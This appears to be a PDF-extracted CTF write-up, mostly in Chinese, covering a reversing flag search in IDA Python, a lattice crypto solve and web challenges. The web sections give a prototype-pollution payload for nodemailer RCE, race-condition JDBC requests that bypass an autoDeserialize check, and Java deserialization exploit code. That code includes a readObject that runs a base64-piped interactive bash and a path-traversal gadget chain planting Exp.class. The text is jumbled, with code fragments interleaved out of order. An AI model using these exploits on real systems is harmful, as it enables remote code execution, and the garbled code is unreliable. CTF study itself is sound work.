  0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 
  0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 
  0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 
  0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 
  0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 
  0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 
  0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 
  0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 
  0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 
  0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 
  0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 
  0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 
  0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 
  0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 
  0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 
  0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 
  0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 
  0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 
  0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 
  0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 
  0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 
  0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 
  0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 
  0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 
  0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 
  0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 
  0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 
  0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 
  0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 
  0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 
  0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 
  0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 
  0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 
  0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 
  0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 
  0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 
  0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 
  0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 
  0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 
  0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 
  0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 
  0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 
  0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 
  0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 
  0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 
  0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 
  0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 
  0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 
  0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 
  0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 
  0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 
  0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 
  0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 
  0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 
  0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 
  0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 
  0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 
  0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 
  0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 
  0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 
  0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 
  0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 
  0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 
  0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 
  0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 
⽣成⼀个256的数组 0,0x100,0x200,0x300,........
看上去应该是个⼆进制压缩之类的算法，每⼀位只会影响之前的，⼿⼯DFS就⾏
⽤IDA Python 下条件断点，⼀点⼀点调整参数
Crypto
  0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 
  0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 
  0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 
  0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 
  0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 
  0x01, 0x00, 0x00, 0x00
};
#  0x401c35
global idx, orig, flag
struct_addr = idc.read_dbg_qword(0x407328)
target_before = idc.read_dbg_byte(struct_addr + 132 + idx - 6) # 这个6和5是慢慢调
出来的，⼀开始是1和0，数字变化⼤了就加⼀点
target = idc.read_dbg_byte(struct_addr + 132 + idx - 5)
new_struct_addr = idc.get_reg_value('R14')
res_before = idc.read_dbg_byte(new_struct_addr + 132 + idx - 6)
res = idc.read_dbg_byte(new_struct_addr + 132 + idx - 5)
print(f'{idx} orig {hex(orig)} target {hex(target)} before {hex(target_before)} 
before_res {hex(res_before)} res {hex(res)}')
if (target_before == res_before and res >= target):
    idx += 1
    orig -= 1 # 这⼀句看情况调
    print(f"[+] Found idx {idx} value {hex(orig)}")   
    flag += chr(orig)
    orig = 0x20
    print(flag) 
orig += 1
idc.set_reg_value(0x401be6, 'RIP')
# 0x401bed
global idx, orig, flag
idc.write_dbg_memory(0x4073ee, b'd3ctf{')
idc.write_dbg_memory(0x4073f4, bytes(flag.encode('ascii')))
idc.write_dbg_memory(0x4073f4 + idx, bytes(chr(orig).encode('ascii')))
d3ctf{w0W_sEems_u_bRe4k_uP_tHe_H1DdeN_s7R_By_Ae1tH_c0De}
babyLattice
#!/usr/bin/env sage
from sage.modules.free_module_integer import IntegerLattice
from collections import namedtuple
from hashlib import sha256
PublicKey = namedtuple('PublicKey', ['n', 'b'])
SecretKey = namedtuple('SecretKey', ['p', 'q', 'A'])
bound = 400
PK = 
PublicKey(n=6980450732819796165412869751031010960804624403043736263963700918494
5533884294737870524186521509776189989451383438084507903660182212556466321058025
7883191930598948255707851053881237189214806988515510241088447820911174087537825
9996194304069589232370236191010739980615057183678664274637196812446564620936621
5361, 
b=65473938578022920848984901484624361251869406821863616908777213906525858437236
1858322141986275106636324098693631439825949471641392200139046541969608293506424
1334877191842222040477750534505320215920037893530959380291687568143644273466724
9049535670986673774487031873808527230023029662915806344014429627710399196)
c = 
6466635493846619405272059181078376903056650465340946512117333136265466523157380
9234913985758725048071311571549777481776826624728742086174609897160897118750243
1927910215773481811303025721859117507974577939210694737300392259917557553409275
06766395262125949939309337338656431876690470938261261164556850871338570
def prmat(m):
  for row in m:
    print(*[{0: "0", 1: "1"}.get(v, "x") for v in row])
# solve for m, r
P. = PolynomialRing(Zmod(PK.n))
bounds = dict(x=2^bound,y=2^bound)
poly = PK.b * x + y - c
poly /= poly.constant_coefficient()
n = len(poly.monomials())
factors = [ZZ(mono.subs(**bounds)) for mono in poly.monomials() if mono != 1]
fmat = diagonal_matrix(QQ, factors)
m = matrix(QQ, n, n)
m[0:n-1,:1] = matrix(ZZ, n-1, 1, poly.coefficients()[:-1])
m[n-1,0] = PK.n
m[:n-1,1:] = ~fmat 
prmat(m)
m = m.LLL()
m[:,1:] *= fmat
WEB
8-bit pub
{"username":"admin","password":{"password":"1"}} 登录
然后利⽤原型污染控制nodemailer⾛⼊执⾏sendmail命令那个分⽀，替换掉path和args，即可rce
non RCE?
这两个请求条件竞争：
GET /;admin/importData?
jdbcUrl=jdbc%3amysql%3a%2f%2f0.0.0.0%3a3306%2fmysql%3fcharacterEncoding%3dutf8%26u
seUnicode%3dtrue%26useSSL%3dfalse&databaseType=mysql&a=§1§ HTTP/1.1
GET /;admin/importData?
jdbcUrl=jdbc%3amysql%3a%2f%2f0.0.0.0%3a3306%2fmysql%3fcharacterEncoding%3dutf8%26u
seUnicode%3dtrue%26useSSL%3dfalse%26statementInterceptors%3dcom.mysql.jdbc.interce
ptors.ServerStatusDiffInterceptor%26autoDeserialize%3dtrue%26user%3dyso_Jdk7u21_to
uch%20/tmp/aaa&databaseType=mysql&a=§1§ HTTP/1.1
就能绕过autoDeserialize的check
Exp.java
m = m.change_ring(ZZ)
# print flag
print(m[0])
real_m = m[0,1]
print('d3ctf{%s}' % sha256(int(real_m).to_bytes(50, 'big')).hexdigest())
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.Serializable;
import java.lang.reflect.Method;
public class Expaaac implements Serializable {
    public String test;
    public Expaaac() throws IOException {
        test = "aa";
    }
    private void writeObject(ObjectInputStream o) throws 
IOException,ClassNotFoundException {
        o.defaultReadObject();
    }
执⾏下⾯代码 ⽣成两个⽂件 ⼀个Object.obj，⽤来把编译好的Exp.class写到⽬标classpath中，Exp.obj
⽤来反序列化时加载Exp.class执⾏其readObject⽅法中的恶意代码。
    private void readObject(ObjectInputStream in) throws Exception {
        in.defaultReadObject();
        Runtime.getRuntime().exec("/bin/bash -c {echo,xx......}|{base64,-d}|
{bash,-i}");
    }
}
import checker.DataMap;
import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;
import java.util.Set;
/**
 * @author Lucifaer
 * @version 3.0
 *
 * Gadget chain:
 * HashSet.readObject()
 *     HashMap.put()
 *         HashMap.hash()
 *             DataMap.Entry.hashCode()
 *                 DataMap.Entry.getValue()
 *                     DataMap.get()
 *                         SimpleCache$StorableCachingMap.put()
 *                             SimpleCache$StorableCachingMap.writeToPath()
 *                                 FileOutputStream.write()
 */
public class test {
    public static Serializable getGadget() throws Exception {
        byte[] content_byte = Files.readAllBytes(new 
File("/Users/smi1e/Downloads/ctf/norce/target/classes/Exp.class").toPath());
        //        String file_content = "lucifaer";
        //        byte[] content_byte = 
file_content.getBytes(StandardCharsets.UTF_8);
        String file_name = 
"../../../../../../../../../../../../../../tmp/webapp/target/classes/Exp.class"
;
        Constructor aspectjConstructor = 
Class.forName("org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap")
.getDeclaredConstructors()[0];
        aspectjConstructor.setAccessible(true);
        Object simpleCache = aspectjConstructor.newInstance(".", 12);
        HashMap wrapperMap = new HashMap();
        wrapperMap.put(file_name, content_byte);
        DataMap dataMap = new DataMap(wrapperMap, (Map) simpleCache);
        Constructor entryConstructor = 
Class.forName("checker.DataMap$Entry").getDeclaredConstructors()[0];
        entryConstructor.setAccessible(true);
        Object entry = entryConstructor.newInstance(dataMap, file_name);
        HashSet map = new HashSet(1);
        map.add("foo");
        Field field = null;
        try {
            field = HashSet.class.getDeclaredField("map");
        } catch (NoSuchFieldException e) {
            field = HashSet.class.getDeclaredField("backingMap");
        }
        field.setAccessible(true);
        HashMap innimpl = (HashMap) field.get(map);
        Field f2 = null;